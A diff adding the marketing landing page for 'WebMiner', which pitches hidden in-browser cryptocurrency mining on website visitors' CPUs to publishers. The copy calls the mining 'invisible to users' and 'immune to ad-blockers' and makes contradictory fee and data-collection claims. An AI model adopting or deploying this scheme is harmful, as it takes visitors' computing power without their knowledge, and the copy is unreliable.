@@ -1,0 +1,3051 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>COMPUTE MONETIZATION</title>
+    <meta
+      name="description"
+      content="Convert idle CPU cycles into deterministic revenue. Zero-data. Zero-ads. Pure compute."
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              display: ['"Space Grotesk"', "sans-serif"],
+            },
+            colors: {
+              bg: "#09090B",
+              fg: "#FAFAFA",
+              muted: "#27272A",
+              "muted-fg": "#A1A1AA",
+              accent: "#DFE104",
+              "accent-fg": "#000000",
+              border: "#3F3F46",
+            },
+          },
+        },
+      };
+    </script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        background: #09090b;
+        font-family: "Space Grotesk", sans-serif;
+      }
+      ::selection {
+        background: #dfe104;
+        color: #000;
+      }
+      ::-webkit-scrollbar {
+        width: 6px;
+      }
+      ::-webkit-scrollbar-track {
+        background: #09090b;
+      }
+      ::-webkit-scrollbar-thumb {
+        background: #3f3f46;
+      }
+
+      /* Noise texture overlay */
+      .noise-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        pointer-events: none;
+        opacity: 0.03;
+        mix-blend-mode: overlay;
+      }
+
+      /* Marquee animation */
+      @keyframes marquee-left {
+        from {
+          transform: translateX(0);
+        }
+        to {
+          transform: translateX(-50%);
+        }
+      }
+      @keyframes marquee-right {
+        from {
+          transform: translateX(-50%);
+        }
+        to {
+          transform: translateX(0);
+        }
+      }
+      .marquee-left {
+        animation: marquee-left 30s linear infinite;
+      }
+      .marquee-right {
+        animation: marquee-right 25s linear infinite;
+      }
+      .marquee-fast {
+        animation-duration: 18s;
+      }
+      .marquee-slow {
+        animation-duration: 40s;
+      }
+
+      /* Reduced motion */
+      @media (prefers-reduced-motion: reduce) {
+        .marquee-left,
+        .marquee-right {
+          animation: none !important;
+          transform: translateX(0) !important;
+        }
+        .scroll-reveal {
+          opacity: 1 !important;
+          transform: none !important;
+        }
+      }
+
+      /* Scroll reveal */
+      .scroll-reveal {
+        opacity: 0;
+        transform: translateY(40px) scale(0.96);
+        transition: opacity 0.6s ease, transform 0.6s ease;
+      }
+      .scroll-reveal.visible {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+
+      /* Card hover inversion */
+      .invert-card {
+        transition: background-color 0.2s, border-color 0.2s;
+      }
+      .invert-card:hover {
+        background: #dfe104 !important;
+        border-color: #dfe104 !important;
+      }
+      .invert-card:hover .card-title,
+      .invert-card:hover .card-desc,
+      .invert-card:hover .card-number,
+      .invert-card:hover .card-icon {
+        color: #000 !important;
+      }
+
+      /* Accordion */
+      details summary::-webkit-details-marker {
+        display: none;
+      }
+      details[open] .faq-answer {
+        animation: slideDown 0.3s ease;
+      }
+      @keyframes slideDown {
+        from {
+          opacity: 0;
+          max-height: 0;
+        }
+        to {
+          opacity: 1;
+          max-height: 500px;
+        }
+      }
+
+      /* Glitch text effect */
+      .glitch-text {
+        position: relative;
+      }
+      .glitch-text::after {
+        content: attr(data-text);
+        position: absolute;
+        left: 2px;
+        top: 2px;
+        color: #dfe104;
+        opacity: 0;
+        z-index: -1;
+        transition: opacity 0.2s;
+      }
+      .glitch-text:hover::after {
+        opacity: 0.4;
+      }
+
+      /* Input focus */
+      .kinetic-input:focus {
+        border-bottom-color: #dfe104;
+        outline: none;
+      }
+      .kinetic-input::placeholder {
+        color: #27272a;
+        text-transform: uppercase;
+      }
+
+      /* Sticky card stacking */
+      .sticky-card {
+        position: sticky;
+      }
+    </style>
+  </head>
+  <body class="bg-bg text-fg overflow-x-hidden font-display antialiased">
+    <!-- SVG Noise Overlay -->
+    <svg
+      class="noise-overlay"
+      viewBox="0 0 200 200"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <title>Noise texture overlay</title>
+      <filter id="noise">
+        <feTurbulence
+          type="fractalNoise"
+          baseFrequency="0.8"
+          numOctaves="4"
+          stitchTiles="stitch"
+        />
+      </filter>
+      <rect width="100%" height="100%" filter="url(#noise)" />
+    </svg>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- NAVIGATION -->
+    <!-- ═══════════════════════════════════════ -->
+    <nav
+      class="fixed top-0 w-full z-50 border-b-2 border-border bg-bg/95 backdrop-blur-sm"
+    >
+      <div
+        class="max-w-[95vw] mx-auto px-4 md:px-8 h-16 md:h-20 flex justify-between items-center"
+      >
+        <a href="#" class="flex items-center gap-2">
+          <span class="text-xl md:text-2xl font-bold tracking-tighter uppercase"
+            >Web<span class="text-accent">Miner</span></span
+          >
+        </a>
+        <div class="hidden lg:flex items-center gap-8">
+          <a
+            href="#platform"
+            class="text-sm uppercase tracking-widest text-muted-fg hover:text-accent transition-colors"
+            >Platform</a
+          >
+          <a
+            href="#architecture"
+            class="text-sm uppercase tracking-widest text-muted-fg hover:text-accent transition-colors"
+            >Architecture</a
+          >
+          <a
+            href="#economics"
+            class="text-sm uppercase tracking-widest text-muted-fg hover:text-accent transition-colors"
+            >Economics</a
+          >
+          <a
+            href="#deploy"
+            class="text-sm uppercase tracking-widest text-muted-fg hover:text-accent transition-colors"
+            >Deploy</a
+          >
+          <a
+            href="#tutorials"
+            class="text-sm uppercase tracking-widest text-muted-fg hover:text-accent transition-colors"
+            >Tutorials</a
+           >
+          <a
+            href="#faq"
+            class="text-sm uppercase tracking-widest text-muted-fg hover:text-accent transition-colors"
+            >FAQ</a
+          >
+        </div>
+        <div class="flex items-center gap-3">
+          <a
+            href="#deploy"
+            class="hidden md:inline-flex uppercase text-sm font-bold tracking-tighter px-6 py-3 border-2 border-border hover:bg-fg hover:text-bg transition-all"
+            >Get Started</a
+          >
+          <a
+            href="https://github.com/romannnoodesl/earnify.mine.bz"
+            class="text-sm uppercase tracking-tighter font-bold text-muted-fg hover:text-accent transition-colors"
+            >GitHub</a
+          >
+        </div>
+      </div>
+    </nav>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- MARQUEE BANNER -->
+    <!-- ═══════════════════════════════════════ -->
+    <div
+      class="mt-16 md:mt-20 border-b-2 border-border bg-accent text-bg overflow-hidden"
+    >
+      <div class="flex whitespace-nowrap marquee-left py-3">
+        <span class="flex items-center gap-8 px-4">
+          <span
+            class="text-sm md:text-base font-bold uppercase tracking-tighter"
+            >No Ads ● No Cookies ● No Data Collection ● Open Source ● 1%
+            Platform Fee ● Direct Pool Payouts ●</span
+          >
+          <span
+            class="text-sm md:text-base font-bold uppercase tracking-tighter"
+            >No Ads ● No Cookies ● No Data Collection ● Open Source ● 1%
+            Platform Fee ● Direct Pool Payouts ●</span
+          >
+          <span
+            class="text-sm md:text-base font-bold uppercase tracking-tighter"
+            >No Ads ● No Cookies ● No Data Collection ● Open Source ● 1%
+            Platform Fee ● Direct Pool Payouts ●</span
+          >
+          <span
+            class="text-sm md:text-base font-bold uppercase tracking-tighter"
+            >No Ads ● No Cookies ● No Data Collection ● Open Source ● 1%
+            Platform Fee ● Direct Pool Payouts ●</span
+          >
+          <span
+            class="text-sm md:text-base font-bold uppercase tracking-tighter"
+            >No Ads ● No Cookies ● No Data Collection ● Open Source ● 1%
+            Platform Fee ● Direct Pool Payouts ●</span
+          >
+          <span
+            class="text-sm md:text-base font-bold uppercase tracking-tighter"
+            >No Ads ● No Cookies ● No Data Collection ● Open Source ● 1%
+            Platform Fee ● Direct Pool Payouts ●</span
+          >
+        </span>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- HERO SECTION -->
+    <!-- ═══════════════════════════════════════ -->
+    <header
+      class="relative min-h-[90vh] md:min-h-screen flex flex-col justify-center border-b-2 border-border overflow-hidden"
+    >
+      <!-- Massive background number -->
+      <div
+        class="absolute -right-8 md:right-0 top-1/2 -translate-y-1/2 select-none pointer-events-none"
+        aria-hidden="true"
+      >
+        <span
+          class="text-[20rem] md:text-[28rem] lg:text-[36rem] font-bold text-muted leading-none tracking-tighter opacity-30"
+          >2.4</span
+        >
+      </div>
+
+      <div
+        class="max-w-[95vw] mx-auto px-4 md:px-8 w-full relative z-10 py-20 md:py-0"
+      >
+        <!-- Small label -->
+        <div class="mb-6 md:mb-8">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-muted-fg font-medium"
+            >Publisher Revenue Infrastructure v2.4.1</span
+          >
+        </div>
+
+        <!-- Main headline -->
+        <h1
+          class="text-[clamp(3rem,10vw,10rem)] font-bold leading-[0.85] tracking-tighter uppercase mb-6 md:mb-8"
+        >
+          <span class="block">UNSHACKLE</span>
+          <span class="block">YOUR</span>
+          <span class="block text-accent">REVENUE</span>
+        </h1>
+
+        <!-- Sub headline -->
+        <p
+          class="text-lg md:text-xl lg:text-2xl text-muted-fg max-w-2xl leading-tight mb-8 md:mb-12"
+        >
+          Convert idle CPU cycles into deterministic yield. Zero tracking
+          pixels. Zero invasive ads. Pure compute monetization.
+        </p>
+
+        <!-- Stats row — HERO -->
+<div class="flex flex-wrap gap-8 md:gap-16 mb-10 md:mb-14">
+  <div>
+    <div class="text-3xl md:text-5xl font-bold tracking-tighter" id="hero-publishers">
+      1000+
+    </div>
+    <div class="text-xs md:text-sm uppercase tracking-widest text-muted-fg mt-1">
+      Publishers with more to come!
+    </div>
+  </div>
+  <div>
+    <div class="text-3xl md:text-5xl font-bold tracking-tighter" id="hero-hashrate">
+      ---<span class="text-accent">KH/s</span>
+    </div>
+    <div class="text-xs md:text-sm uppercase tracking-widest text-muted-fg mt-1">
+      Pool Hashrate
+    </div>
+  </div>
+  <div>
+    <div class="text-3xl md:text-5xl font-bold tracking-tighter" id="hero-estimate">
+      99.9<span class="text-accent">%</span>
+    </div>
+    <div class="text-xs md:text-sm uppercase tracking-widest text-muted-fg mt-1">
+      Pool Efficiency
+    </div>
+  </div>
+</div>
+
+        <!-- CTA buttons -->
+        <div class="flex flex-col sm:flex-row gap-4">
+          <a
+            href="#deploy"
+            class="inline-flex items-center justify-center gap-3 bg-accent text-bg font-bold uppercase tracking-tighter text-sm md:text-base px-8 py-4 md:py-5 hover:scale-105 active:scale-95 transition-transform"
+          >
+            Start Implementing
+            <svg
+              class="w-5 h-5"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                stroke-width="2.5"
+                d="M14 5l7 7-7 7"
+              />
+            </svg>
+          </a>
+          <a
+            href="#platform"
+            class="inline-flex items-center justify-center gap-3 border-2 border-border text-fg font-bold uppercase tracking-tighter text-sm md:text-base px-8 py-4 md:py-5 hover:bg-fg hover:text-bg transition-colors"
+          >
+            Explore Architecture
+          </a>
+        </div>
+      </div>
+
+      
+    </header>
+
+    <!-- ═══════════════════════════════════════ -->
+<!-- LIVE STATS MARQUEE -->
+<!-- ═══════════════════════════════════════ -->
+<div class="border-b-2 border-border bg-muted overflow-hidden">
+  <div class="flex whitespace-nowrap marquee-right marquee-fast py-5 md:py-6">
+    <!-- Marquee content repeated twice for seamless looping -->
+    <span class="flex items-center gap-10 px-4">
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Status</span>
+        <span class="text-base md:text-lg font-bold text-accent flex items-center gap-2">
+          <span class="w-2 h-2 bg-accent rounded-full animate-pulse marquee-status-dot"></span>
+          <span class="marquee-status">Loading…</span>
+        </span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">MinotaurX</span>
+        <span class="text-base md:text-lg font-bold marquee-hashrate">--- KH/s</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Workers</span>
+        <span class="text-base md:text-lg font-bold marquee-workers">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Est. 24h</span>
+        <span class="text-base md:text-lg font-bold marquee-estimate24h">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Payout 24h</span>
+        <span class="text-base md:text-lg font-bold text-accent marquee-payout24h">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">BTC Price</span>
+        <span class="text-base md:text-lg font-bold marquee-btcprice">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Fees</span>
+        <span class="text-base md:text-lg font-bold text-accent marquee-fees">---</span>
+      </span>
+    </span>
+
+    <!-- Duplicate for seamless loop -->
+    <span class="flex items-center gap-10 px-4" aria-hidden="true">
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Status</span>
+        <span class="text-base md:text-lg font-bold text-accent flex items-center gap-2">
+          <span class="w-2 h-2 bg-accent rounded-full animate-pulse marquee-status-dot"></span>
+          <span class="marquee-status">Loading…</span>
+        </span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">MinotaurX</span>
+        <span class="text-base md:text-lg font-bold marquee-hashrate">--- KH/s</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Workers</span>
+        <span class="text-base md:text-lg font-bold marquee-workers">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Est. 24h</span>
+        <span class="text-base md:text-lg font-bold marquee-estimate24h">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Payout 24h</span>
+        <span class="text-base md:text-lg font-bold text-accent marquee-payout24h">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">BTC Price</span>
+        <span class="text-base md:text-lg font-bold marquee-btcprice">---</span>
+      </span>
+      <span class="flex items-center gap-3">
+        <span class="text-xs md:text-sm uppercase tracking-widest text-muted-fg">Fees</span>
+        <span class="text-base md:text-lg font-bold text-accent marquee-fees">---</span>
+      </span>
+    </span>
+  </div>
+</div>
+    <section class="py-20 md:py-32 border-b-2 border-border">
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <!-- Section label -->
+        <div class="mb-8 md:mb-12">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+            >Why WebMiner</span
+          >
+        </div>
+
+        <!-- Headline -->
+        <h2
+          class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-12 md:mb-20 scroll-reveal"
+        >
+          ADVERTISING<br />IS <span class="text-accent">BROKEN.</span><br />WE
+          BUILT<br />THE FIX.
+        </h2>
+
+        <!-- Stats grid -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-px bg-border">
+          <div class="bg-bg p-8 md:p-12 scroll-reveal">
+            <div
+              class="text-[clamp(4rem,10vw,8rem)] font-bold leading-none tracking-tighter text-accent mb-4"
+            >
+              42.7<span class="text-muted-fg text-4xl md:text-6xl">%</span>
+            </div>
+            <p class="text-base md:text-lg text-muted-fg leading-tight">
+              of users deploy ad-blockers, eliminating display revenue entirely
+              for nearly half your audience.
+            </p>
+            <span
+              class="inline-block mt-4 text-xs uppercase tracking-widest text-muted-fg"
+              >Source: Statista 2024</span
+            >
+          </div>
+          <div class="bg-bg p-8 md:p-12 scroll-reveal">
+            <div
+              class="text-[clamp(4rem,10vw,8rem)] font-bold leading-none tracking-tighter mb-4"
+            >
+              -34<span class="text-muted-fg text-4xl md:text-6xl">%</span>
+            </div>
+            <p class="text-base md:text-lg text-muted-fg leading-tight">
+              Year-over-year decline in average CPM rates driven by programmatic
+              oversupply and signal loss.
+            </p>
+            <span
+              class="inline-block mt-4 text-xs uppercase tracking-widest text-muted-fg"
+              >Source: eMarketer 2024</span
+            >
+          </div>
+          <div class="bg-bg p-8 md:p-12 scroll-reveal">
+            <div
+              class="text-[clamp(4rem,10vw,8rem)] font-bold leading-none tracking-tighter mb-4"
+            >
+              $12.4<span class="text-muted-fg text-4xl md:text-6xl">B</span>
+            </div>
+            <p class="text-base md:text-lg text-muted-fg leading-tight">
+              Annual revenue lost to ad-blocking, consent fatigue, and
+              regulatory compliance overhead worldwide.
+            </p>
+            <span
+              class="inline-block mt-4 text-xs uppercase tracking-widest text-muted-fg"
+              >Source: PageFair Report</span
+            >
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- PLATFORM / SOLUTION -->
+    <!-- ═══════════════════════════════════════ -->
+    <section id="platform" class="py-20 md:py-32 border-b-2 border-border">
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <div class="mb-8 md:mb-12">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+            >The Solution</span
+          >
+        </div>
+
+        <h2
+          class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-8 md:mb-12 scroll-reveal"
+        >
+          REVENUE THAT<br />SCALES WITH<br /><span class="text-accent"
+            >ENGAGEMENT.</span
+          >
+        </h2>
+
+        <div class="grid lg:grid-cols-2 gap-12 lg:gap-20 mb-16 md:mb-24">
+          <div class="scroll-reveal">
+            <p
+              class="text-lg md:text-xl lg:text-2xl text-muted-fg leading-tight mb-6"
+            >
+              By deploying our distributed compute module, you create a direct
+              mathematical correlation between active user session time and
+              revenue generation.
+            </p>
+            <p
+              class="text-lg md:text-xl lg:text-2xl text-muted-fg leading-tight mb-8"
+            >
+              Completely independent of volatile ad-bidding networks,
+              third-party cookie deprecation, and invasive tracking
+              architectures.
+            </p>
+            <div class="space-y-4">
+              <div class="flex items-start gap-4 border-b border-border pb-4">
+                <span class="text-accent text-2xl font-bold shrink-0">→</span>
+                <div>
+                  <h4
+                    class="text-base md:text-lg font-bold uppercase tracking-tight"
+                  >
+                    Revenue proportional to engagement
+                  </h4>
+                  <p class="text-sm md:text-base text-muted-fg mt-1">
+                    Longer sessions = higher yield. Incentivizes quality
+                    content.
+                  </p>
+                </div>
+              </div>
+              <div class="flex items-start gap-4 border-b border-border pb-4">
+                <span class="text-accent text-2xl font-bold shrink-0">→</span>
+                <div>
+                  <h4
+                    class="text-base md:text-lg font-bold uppercase tracking-tight"
+                  >
+                    Completely invisible to users
+                  </h4>
+                  <p class="text-sm md:text-base text-muted-fg mt-1">
+                    No visual footprint. No layout shift. No pop-ups.
+                  </p>
+                </div>
+              </div>
+              <div class="flex items-start gap-4 border-b border-border pb-4">
+                <span class="text-accent text-2xl font-bold shrink-0">→</span>
+                <div>
+                  <h4
+                    class="text-base md:text-lg font-bold uppercase tracking-tight"
+                  >
+                    Immune to ad-blockers
+                  </h4>
+                  <p class="text-sm md:text-base text-muted-fg mt-1">
+                    Standard Web Workers — no blocked domains, no filter lists.
+                  </p>
+                </div>
+              </div>
+              <div class="flex items-start gap-4">
+                <span class="text-accent text-2xl font-bold shrink-0">→</span>
+                <div>
+                  <h4
+                    class="text-base md:text-lg font-bold uppercase tracking-tight"
+                  >
+                    Only a 1% platform fee!
+                  </h4>
+                  <p class="text-sm md:text-base text-muted-fg mt-1">
+                    90% of compute yield goes straight to your wallet.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Feature cards -->
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-px bg-border">
+            <div class="invert-card bg-bg p-6 md:p-8 group cursor-default">
+              <div
+                class="text-5xl md:text-6xl font-bold text-muted leading-none mb-4 card-number"
+              >
+                01
+              </div>
+              <h3
+                class="text-lg md:text-xl font-bold uppercase tracking-tight mb-2 card-title"
+              >
+                Zero-Data Footprint
+              </h3>
+              <p class="text-sm text-muted-fg card-desc">
+                No cookies, tracking pixels, or fingerprinting. 100% GDPR/CCPA
+                compliant by design.
+              </p>
+            </div>
+            <div class="invert-card bg-bg p-6 md:p-8 group cursor-default">
+              <div
+                class="text-5xl md:text-6xl font-bold text-muted leading-none mb-4 card-number"
+              >
+                02
+              </div>
+              <h3
+                class="text-lg md:text-xl font-bold uppercase tracking-tight mb-2 card-title"
+              >
+                100% Fill Rate
+              </h3>
+              <p class="text-sm text-muted-fg card-desc">
+                Every single user session generates revenue. Zero wasted
+                impressions. Zero unfilled slots.
+              </p>
+            </div>
+            <div class="invert-card bg-bg p-6 md:p-8 group cursor-default">
+              <div
+                class="text-5xl md:text-6xl font-bold text-muted leading-none mb-4 card-number"
+              >
+                03
+              </div>
+              <h3
+                class="text-lg md:text-xl font-bold uppercase tracking-tight mb-2 card-title"
+              >
+                Thread Control
+              </h3>
+              <p class="text-sm text-muted-fg card-desc">
+                Limit hardware concurrency. Execute on n−1 threads to preserve
+                the primary UI core.
+              </p>
+            </div>
+            <div class="invert-card bg-bg p-6 md:p-8 group cursor-default">
+              <div
+                class="text-5xl md:text-6xl font-bold text-muted leading-none mb-4 card-number"
+              >
+                04
+              </div>
+              <h3
+                class="text-lg md:text-xl font-bold uppercase tracking-tight mb-2 card-title"
+              >
+                Open Source
+              </h3>
+              <p class="text-sm text-muted-fg card-desc">
+                Every line publicly auditable.
+              </p>
+            </div>
+            <div class="invert-card bg-bg p-6 md:p-8 group cursor-default">
+              <div
+                class="text-5xl md:text-6xl font-bold text-muted leading-none mb-4 card-number"
+              >
+                05
+              </div>
+              <h3
+                class="text-lg md:text-xl font-bold uppercase tracking-tight mb-2 card-title"
+              >
+                Global Pools
+              </h3>
+              <p class="text-sm text-muted-fg card-desc">
+                Connect to any stratum-compatible pool worldwide. Multi-region
+                failover. the default will be zpool
+              </p>
+            </div>
+            <div class="invert-card bg-bg p-6 md:p-8 group cursor-default">
+              <div
+                class="text-5xl md:text-6xl font-bold text-muted leading-none mb-4 card-number"
+              >
+                06
+              </div>
+              <h3
+                class="text-lg md:text-xl font-bold uppercase tracking-tight mb-2 card-title"
+              >
+                5-Min Setup
+              </h3>
+              <p class="text-sm text-muted-fg card-desc">
+                Single script tag. No build tools. Works with React, Vue,
+                Next.js, Svelte.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- ARCHITECTURE -->
+    <!-- ═══════════════════════════════════════ -->
+    <section
+      id="architecture"
+      class="py-20 md:py-32 border-b-2 border-border bg-muted"
+    >
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <div class="mb-8 md:mb-12">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+            >System Architecture</span
+          >
+        </div>
+
+        <h2
+          class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-12 md:mb-20 scroll-reveal"
+        >
+          HOW IT<br />WORKS<span class="text-accent">.</span>
+        </h2>
+
+        <!-- Pipeline steps -->
+        <div
+          class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-px bg-border mb-16 md:mb-24"
+        >
+          <div class="bg-bg p-6 md:p-8 scroll-reveal">
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold text-muted leading-none tracking-tighter mb-4"
+            >
+              01
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Bootstrap
+            </h3>
+            <p class="text-sm md:text-base text-muted-fg leading-tight">
+              ES module loads asynchronously. Detects hardwareConcurrency,
+              device type, and battery status for optimal thread allocation.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 scroll-reveal">
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold text-muted leading-none tracking-tighter mb-4"
+            >
+              02
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Spawn
+            </h3>
+            <p class="text-sm md:text-base text-muted-fg leading-tight">
+              Dedicated Web Workers spawned per allocated thread. Each runs
+              isolated WebAssembly hashing with zero main-thread interference.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 scroll-reveal">
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold text-muted leading-none tracking-tighter mb-4"
+            >
+              03
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Compute
+            </h3>
+            <p class="text-sm md:text-base text-muted-fg leading-tight">
+              Workers iterate through nonce space computing cryptographic hashes
+              against difficulty targets. Valid shares are queued.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 scroll-reveal border-2 border-accent">
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold text-accent leading-none tracking-tighter mb-4"
+            >
+              04
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Payout
+            </h3>
+            <p class="text-sm md:text-base text-muted-fg leading-tight">
+              Valid shares submitted to pool via WebSocket stratum. Wallet
+              credited proportionally. Automatic payout processing.
+            </p>
+          </div>
+        </div>
+
+        <!-- Tech specs -->
+        <div class="scroll-reveal">
+          <h3
+            class="text-2xl md:text-3xl font-bold uppercase tracking-tighter mb-8"
+          >
+            Technical Specs
+          </h3>
+          <div
+            class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-px bg-border"
+          >
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Algorithms</span
+              >
+              <span class="text-lg md:text-xl font-bold"
+                >Power2B, yespower, yescrypt, minotaurx(our default + most
+                profitable), and ghostrider
+              </span>
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Execution</span
+              >
+              <span class="text-lg md:text-xl font-bold"
+                >Web Workers + WASM</span
+              >
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Thread Limit</span
+              >
+              <span class="text-lg md:text-xl font-bold"
+                >1 to n (default: n−1)</span
+              >
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Protocol</span
+              >
+              <span class="text-lg md:text-xl font-bold"
+                >Stratum V1 over WebSocket</span
+              >
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Bundle Size</span
+              >
+              <span class="text-lg md:text-xl font-bold">1MB</span>
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Data Collection</span
+              >
+              <span class="text-lg md:text-xl font-bold text-accent"
+                >None. Ever.</span
+              >
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Memory</span
+              >
+              <span class="text-lg md:text-xl font-bold"
+                >~2MB/worker (Minotaurx)</span
+              >
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Browser Support</span
+              >
+              <span class="text-lg md:text-xl font-bold"
+                >Chrome 80+, FF 78+, Safari 14+, Brave</span
+              >
+            </div>
+            <div class="bg-bg p-6 flex flex-col gap-2">
+              <span class="text-xs uppercase tracking-widest text-muted-fg"
+                >Main Thread Impact</span
+              >
+              <span class="text-lg md:text-xl font-bold text-accent"
+                >&lt;2% overhead</span
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- ECONOMICS / YIELD -->
+    <!-- ═══════════════════════════════════════ -->
+    <section id="economics" class="py-20 md:py-32 border-b-2 border-border">
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <div class="mb-8 md:mb-12">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+            >Revenue Economics</span
+          >
+        </div>
+
+        <h2
+          class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-12 md:mb-20 scroll-reveal"
+        >
+          DETERMINISTIC<br />YIELD<span class="text-accent">.</span><br />NO
+          BLACK<br />BOXES<span class="text-accent">.</span>
+        </h2>
+
+        <!-- Formula -->
+        <div
+          class="border-2 border-border p-8 md:p-12 mb-12 md:mb-20 scroll-reveal"
+        >
+          <div
+            class="text-xs md:text-sm uppercase tracking-widest text-muted-fg mb-6 font-medium"
+          >
+            Aggregate Revenue Projection Model
+          </div>
+          <div
+            class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tight text-accent mb-6 font-mono"
+          >
+            E = Σ (H<sub>i</sub> · t<sub>i</sub> · R)
+          </div>
+          <p class="text-sm md:text-base text-muted-fg max-w-2xl leading-tight">
+            Total yield expressed as summation of each session's contribution —
+            accounting for device-specific hashrate, session duration, and
+            real-time network reward conditions.
+          </p>
+        </div>
+
+        <!-- Variable legend -->
+        <div
+          class="grid grid-cols-1 md:grid-cols-2 gap-px bg-border mb-12 md:mb-20"
+        >
+          <div class="bg-bg p-6 md:p-8 scroll-reveal">
+            <code class="text-3xl md:text-4xl font-bold text-accent block mb-3"
+              >E</code
+            >
+            <span
+              class="text-base md:text-lg font-bold uppercase tracking-tight block mb-2"
+              >Total Yield Revenue</span
+            >
